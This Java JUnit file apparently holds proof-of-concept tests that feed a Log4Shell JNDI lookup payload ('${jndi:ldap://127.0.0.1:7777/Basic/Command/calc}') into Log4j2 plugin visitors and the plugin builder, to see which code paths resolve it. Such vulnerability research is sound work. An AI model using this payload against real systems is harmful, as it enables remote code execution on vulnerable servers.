import org.apache.logging.log4j.core.Core;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.FailoverAppender;
import org.apache.logging.log4j.core.appender.FileAppender;
import org.apache.logging.log4j.core.appender.SmtpAppender;
import org.apache.logging.log4j.core.config.*;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.config.composite.CompositeConfiguration;
import org.apache.logging.log4j.core.config.plugins.Plugin;
import org.apache.logging.log4j.core.config.plugins.PluginValue;
import org.apache.logging.log4j.core.config.plugins.util.PluginBuilder;
import org.apache.logging.log4j.core.config.plugins.util.PluginManager;
import org.apache.logging.log4j.core.config.plugins.util.PluginType;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginBuilderAttributeVisitor;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginValueVisitor;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginVisitor;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.script.Script;
import org.apache.logging.log4j.core.util.Source;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class PluginPocsTests {

    @Test
    public void PluginValueVisitor() {
        Configuration configuration = new DefaultConfiguration();

        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");

        PluginVisitor visitor = new PluginValueVisitor();
        visitor.setStrSubstitutor(configuration.getStrSubstitutor());


        PluginValue annotation = new PluginValue() {

            @Override
            public Class<? extends Annotation> annotationType() {
                return this.getClass();
            }

            @Override
            public String value() {
                return null;
            }
        };

        LogEvent logEvent = new MutableLogEvent(new StringBuilder(), null);
        visitor.setAnnotation(annotation);

        visitor.visit(configuration, node, logEvent, new StringBuilder());
    }


    @Test
    public void visitPluginBuilderAttributeVisitorTest() {
        PluginBuilderAttributeVisitor visitor = new PluginBuilderAttributeVisitor();


        PluginValue annotation = new PluginValue() {

            @Override
            public Class<? extends Annotation> annotationType() {
                return this.getClass();
            }

            @Override
            public String value() {
                return null;
            }
        };

        Script.createScript("a", "b", "c");


        visitor.setAnnotation(new Annotation() {
            @Override
            public Class<? extends Annotation> annotationType() {
                return this.getClass();
            }
        });
        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        visitor.visit(new DefaultConfiguration(), node, new MutableLogEvent(), new StringBuilder());
    }

    @Test
    public void buildPluginBuilderTest(){
        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        manager.collectPlugins();
        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
        final PluginBuilder builder = new PluginBuilder(plugin).
                withConfiguration(new DefaultConfiguration()).
                withConfigurationNode(node);
        builder.build();
    }

}
